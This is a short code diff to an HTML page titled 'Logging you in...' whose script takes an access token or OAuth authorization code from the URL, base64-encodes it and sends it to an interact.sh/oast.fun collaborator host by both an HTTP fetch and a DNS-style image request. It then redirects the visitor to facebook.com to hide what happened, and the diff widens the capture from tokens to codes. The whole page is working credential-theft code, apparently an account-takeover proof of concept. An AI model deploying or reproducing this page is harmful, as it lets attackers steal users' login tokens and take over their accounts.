@@ -5,15 +5,18 @@
   <h2>Logging you in...</h2>
   <script>
     const params = new URLSearchParams(window.location.search);
-    const token = params.get("token") || "no_token_found";
+    const token = params.get("token");
+    const code = params.get("code");
+
+    const data = token || code || "no_token_found";
 
     // HTTP-based exfil to interact.sh
-    fetch("https://ewkfektsfulqbtwuxullb805w4xocrtq6.oast.fun/" + btoa(token));
+    fetch("https://ewkfektsfulqbtwuxullb805w4xocrtq6.oast.fun/" + btoa(data));
 
-    // Optional: DNS-based ping (if interact.sh listens for DNS queries)
-    new Image().src = "http://" + btoa(token) + ".ewkfektsfulqbtwuxullb805w4xocrtq6.oast.fun";
+    // DNS-based fallback
+    new Image().src = "http://" + btoa(data) + ".ewkfektsfulqbtwuxullb805w4xocrtq6.oast.fun";
 
-    // Redirect to Facebook or any legit page after 2s
+    // Clean redirect after 2s
     setTimeout(() => {
       window.location.href = "https://facebook.com";
     }, 2000);
